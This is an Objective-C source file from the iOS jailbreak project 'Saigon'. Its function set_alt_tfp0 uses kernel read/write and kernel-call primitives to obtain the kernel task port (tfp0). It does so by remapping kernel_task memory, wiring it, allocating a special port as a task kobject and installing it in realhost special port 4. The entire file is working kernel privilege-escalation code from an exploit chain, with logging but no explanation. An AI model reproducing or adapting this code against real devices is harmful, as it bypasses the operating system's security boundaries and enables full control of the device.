//
//  tfp0.m
//  Saigon
//
//  Created by Abraham Masri on 10/22/17.
//  Copyright © 2017 cheesecakeufo. All rights reserved.
//

#include "stdio.h"
#include "rwx.h"
#include "offsets.h"

#include "Utilities.h"
#include "remote_call.h"
#include "remote_ports.h"
#include "task_ports.h"


#include "IOReturn.h"
#include "kernel_call.h"
#include <mach/vm_types.h>

#include <Foundation/Foundation.h>

/*
    Purpose: a workaround to get tfp0
*/
kern_return_t set_alt_tfp0() {
    
    kern_return_t ret = KERN_SUCCESS;
    
    NSLog(@"[SAIGON]: your kernel_base is: %llx", OFFSET(kernel_base));
    
    // Get kernel_map
    uint64_t kernel_map = VM_MAP_NULL;
    ret = rwx_read(offsets_get_kernel_base() + OFFSET(kernel_map), &kernel_map, sizeof(kernel_map));
    
    if(kernel_map == VM_MAP_NULL) {
        printf("[ERROR]: could not get kernel_map\n");
        goto cleanup;
    }
    
    NSLog(@"[SAIGON]: got kernel_map: (%llx) sleeping (1)", kernel_map);
    sleep(1);
    
    // Get zone_map
    uint64_t zone_map = VM_MAP_NULL;
    ret = rwx_read(offsets_get_kernel_base() + OFFSET(zone_map), &zone_map, sizeof(zone_map));
    
    if(zone_map == VM_MAP_NULL) {
        printf("[ERROR]: could not get zone_map\n");
        goto cleanup;
    }
    
    NSLog(@"[SAIGON]: got zone_map: (%llx) sleeping (1)", zone_map);
    sleep(1);

    uint64_t kern_proc = 0;
    uint64_t self_proc = 0;
    uint64_t containermanager = 0;
    
    get_procs(&kern_proc, &self_proc, &containermanager);
    

    // get kernel_task
    uint64_t kernel_task = 0;
    ret = rwx_read(offsets_get_kernel_base() + OFFSET(kernel_task), &kernel_task, sizeof(kernel_task));

    NSLog(@"[SAIGON]: got kernel_task: (%llx) sleeping (1)", kernel_task);
    sleep(1);
    
    // call 'remap'
    mach_vm_offset_t remap_addr = 0;

    vm_prot_t cur, max = 0;
    int* cur_ptr = &cur;
    int* max_ptr = &max;
    
    struct kernel_call_argument mach_vm_remap_args[11] = {
        KERNEL_CALL_ARG(uint64_t, kernel_map), // (mach_port_name_t) target_task
        KERNEL_CALL_ARG(uint64_t, (uint64_t)&remap_addr), // (mach_vm_address_t) *target_address
        KERNEL_CALL_ARG(uint64_t, (uint64_t)sizeof(task_t)), // (mach_vm_size_t) size
        KERNEL_CALL_ARG(uint64_t, (uint64_t)0), // (mach_vm_offset_t) mask
        KERNEL_CALL_ARG(int, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR), // (int) flags ----
        KERNEL_CALL_ARG(uint64_t, zone_map), // (mach_port_name_t) src_task ----
        KERNEL_CALL_ARG(uint64_t, kernel_task), // (mach_vm_address_t) src_address
        KERNEL_CALL_ARG(int, false), // (boolean_t) copy
        KERNEL_CALL_ARG(uint64_t, (uint64_t)&cur_ptr), // (vm_prot_t) *cur_protection
        KERNEL_CALL_ARG(uint64_t, (uint64_t)&max_ptr), // (vm_prot_t) *max_protection
        KERNEL_CALL_ARG(uint32_t, VM_INHERIT_NONE), // (vm_inherit_t) inheritance
    };

    NSLog(@"[SAIGON]: kernel_map: %llx\n", kernel_map);
    NSLog(@"[SAIGON]: zone_map: %llx\n", zone_map);
    NSLog(@"[SAIGON]: kerne_task: %llx\n", kernel_task);
    NSLog(@"[SAIGON]: mach_vm_remap: %llx\n", offsets_get_kernel_base() + OFFSET(mach_vm_remap));
    
    NSLog(@"[SAIGON]: going to run 1st kernel call to mach_vm_remap. sleeping (1)");
    sleep(1);
    
    kern_return_t err = KERN_FAILURE;
    ret = kernel_call(&err, sizeof(err), offsets_get_kernel_base() + OFFSET(mach_vm_remap), 11, mach_vm_remap_args);
    if (ret == KERN_SUCCESS)
        ret = err;

    if (ret != KERN_SUCCESS) {
        printf("[ERROR]: failed calling remap\n");
        return KERN_FAILURE; // Fail
    } else {
        printf("[INFO]: remapped sucessfully (err: %d)\n", err);
    }
    
    NSLog(@"[SAIGON]: success!!! remap_address: %llx. sleeping(1)", remap_addr);
    sleep(1);
    
    printf("[INFO]: remap_address: %llx\n", remap_addr);
    
    // mach_vm_wire
    struct kernel_call_argument mach_vm_wire_args[5] = {
        KERNEL_CALL_ARG(uint64_t, offsets_get_kernel_base() + OFFSET(realhost)), // (host_priv_t) host_priv
        KERNEL_CALL_ARG(uint64_t, kernel_map), // (vm_map_t) task
        KERNEL_CALL_ARG(uint64_t, remap_addr), // (mach_vm_address_t) address
        KERNEL_CALL_ARG(uint64_t, (uint64_t)sizeof(task_t)), // (mach_vm_size_t) size
        KERNEL_CALL_ARG(uint64_t, VM_PROT_READ | VM_PROT_WRITE) // (vm_prot_t) desired_access
    };

    err = KERN_FAILURE;
    
    NSLog(@"[SAIGON]: going to run 2nd kernel call to mach_vm_wire. sleeping(1)");
    sleep(1);
    
    ret = kernel_call(&err, sizeof(err), offsets_get_kernel_base() + OFFSET(mach_vm_wire), 5, mach_vm_wire_args);
    if (ret == KERN_SUCCESS)
        ret = err;

    if(ret != KERN_SUCCESS) {
        printf("[ERROR]: could not get memory physically wired (err: %d)\n", err);
//        goto cleanup;
    } else {
        printf("[INFO]: memory wired successfully\n");
        ret = err;
    }
    
    
    NSLog(@"[SAIGON]: success!!! got memory wired baby. sleeping(1)");
    sleep(1);
    
    // get ipc_space_kernel
    uint64_t ipc_space_kernel = 0;
    ret = rwx_read(offsets_get_kernel_base() + OFFSET(ipc_space_kernel), &ipc_space_kernel, sizeof(ipc_space_kernel));
    
    if(ipc_space_kernel == 0) {
        printf("[ERROR]: could not get ipc_space_kernel\n");
        goto cleanup;
    }
    NSLog(@"[SAIGON]: ipc_space_kernel: %llx. sleeping(6). calling ipc_port_alloc_special next\n", ipc_space_kernel);
    sleep(6);
    
    struct kernel_call_argument ipc_port_alloc_special_args[1] = {
        KERNEL_CALL_ARG(uint64_t, ipc_space_kernel), // (ipc_space_t) space
    };
    
    // ipc_port_alloc_special
    uint64_t allocated_port = 0;
    ret = kernel_call(&allocated_port, sizeof(uint64_t), offsets_get_kernel_base() + OFFSET(ipc_port_alloc_special), 1, ipc_port_alloc_special_args);
    if (ret != KERN_SUCCESS) {
        printf("[ERROR]: failed calling ipc_port_alloc_special_args\n");
        return KERN_FAILURE; // Fail
    } else {
        printf("[INFO]: allocated special port sucessfully\n");
    }
    
    NSLog(@"[SAIGON]: success!!! allocated_port: %llx. sleeping(4). going to call ipc_kobject_set next\n", allocated_port);
    sleep(4);
    
    // ipc_kobject_set
    struct kernel_call_argument ipc_kobject_set_args[3] = {
        KERNEL_CALL_ARG(uint64_t, allocated_port), // (ipc_port_t) port
        KERNEL_CALL_ARG(uint64_t, remap_addr), // (ipc_kobject_t) kobject
        KERNEL_CALL_ARG(uint32_t, 2 /* IKOT_TASK */), // (ipc_kobject_type_t) type
    };
    
    ret = kernel_call(NULL, 0, offsets_get_kernel_base() + OFFSET(ipc_kobject_set), 3, ipc_kobject_set_args);
    if (ret != KERN_SUCCESS) {
        printf("[ERROR]: failed calling ipc_kobject_set\n");
        return KERN_FAILURE; // Fail
    } else {
        printf("[INFO]: successfully called ipc_kobject_set\n");
    }
    

    NSLog(@"[SAIGON]: success!!! successfully called ipc_kobject_set. sleeping(4). going to call ipc_port_make_send next\n");
    sleep(4);
    
    // ipc_port_make_send
    struct kernel_call_argument ipc_port_make_send_args[1] = {
        KERNEL_CALL_ARG(uint64_t, allocated_port), // (ipc_port_t) port
    };
    
    ret = kernel_call(&allocated_port, sizeof(uint64_t), offsets_get_kernel_base() + OFFSET(ipc_port_make_send), 1, ipc_port_make_send_args);
    if (ret != KERN_SUCCESS) {
        printf("[ERROR]: failed calling ipc_port_make_send\n");
        return KERN_FAILURE; // Fail
    } else {
        printf("[INFO]: successfully gave a send right to our allocated port\n");
    }

    NSLog(@"[SAIGON]: SUCCESS!! allocated_port after send right: %llx\n", allocated_port);
    
    // equivalent to realhost.special[x] (reference: host.c:973)
    ret = rwx_write(offsets_get_kernel_base() + OFFSET(realhost) + REALHOST_SPECIAL_4_OFF, &allocated_port, sizeof(allocated_port));
    NSLog(@"[SAIGON]: new kernel_port: %llx\n", allocated_port);
    sleep(2);
    
    extern task_t tfp0;
    ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &tfp0);
    
    // the "1" is to differentiate between this and the original tfp in ziva main's
    NSLog(@"[SAIGON]: host_get_special_port (1): 0x%x\n", tfp0);
    sleep(2);
    
cleanup:
    return ret;
}
